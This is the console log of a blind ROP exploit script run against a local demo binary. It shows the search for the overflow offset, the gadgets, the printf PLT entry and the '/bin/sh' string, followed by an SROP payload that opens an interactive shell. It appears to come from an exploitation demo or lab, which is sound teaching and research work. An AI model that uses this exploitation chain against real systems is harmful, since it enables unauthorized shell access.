```
python3 pwn-brop.py BIN=./ghost.bin
[*] '/demos/brop-demo/ghost.bin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 17 cached gadgets for './ghost.bin'
[*]     Trying to crash program with 1 bytes
[*]     Trying to crash program with 2 bytes
[*]     Trying to crash program with 3 bytes
[*]     Trying to crash program with 4 bytes
[*]     Trying to crash program with 5 bytes
[*]     Trying to crash program with 6 bytes
...
[*] Discovered offset = 40
[*] Paused (press any to continue)
[*]     Testing for stop gadget at 0x4006aa
[*]     Testing for stop gadget at 0x4006ab
[*]     Testing for stop gadget at 0x4006ac
[*]     Testing for stop gadget at 0x4006ad
[*]     Testing for stop gadget at 0x4006ae
[*]     Testing for stop gadget at 0x4006af
[*]     Testing for stop gadget at 0x4006b0
[*]     Testing for stop gadget at 0x4006b1
[*]     Testing for stop gadget at 0x4006b2
[*]     Testing for stop gadget at 0x4006b3
[*] Discovered stop gadget = 0x4006b3
[*] brop gagdet  = 0x400c76
[*] pop rdi, ret = 0x400c83
[*] ret = 0x400c84
[*] Paused (press any to continue)
[*] Paused (press any to continue)
[*]     Testing for printf PLT at 0x400526
[*]     Testing for printf PLT at 0x400527
[*]     Testing for printf PLT at 0x400528
[*]     Testing for printf PLT at 0x400529
[*]     Testing for printf PLT at 0x40052a
[*]     Testing for printf PLT at 0x40052b
[*]     Testing for printf PLT at 0x40052c
[*]     Testing for printf PLT at 0x40052d
[*]     Testing for printf PLT at 0x40052e
[*]     Testing for printf PLT at 0x40052f
[*]     Testing for printf PLT at 0x400530
[*] printf plt entry = 0x400530
[*] Paused (press any to continue)
...
[*] bin/sh = 0x401a29
[*] Paused (press any to continue)
[*] throwing SROP exploit at the ghost
[+] Starting local process '/demos/brop-demo/ghost.bin': pid 4180
[*] Switching to interactive mode
```